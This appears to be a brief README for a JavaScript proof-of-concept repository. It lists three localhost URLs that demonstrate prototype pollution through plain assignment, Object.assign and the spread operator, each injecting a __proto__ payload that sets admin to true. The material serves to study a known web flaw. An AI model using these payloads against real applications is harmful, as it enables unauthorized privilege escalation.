# Javascript code

### All the POCs and garbage code goes here.

* Parameter Pollution - `routes/prototypepollution`

    Normal assignment - `http://localhost:3000/proto?attr=__proto__&value={"admin":"true"}`

    Object.assign - `http://localhost:3000/proto/2?value={"__proto__":{"admin":"true"}}`

    Spread operator - `http://localhost:3000/proto/3?value={"__proto__":{"admin":"true"}}`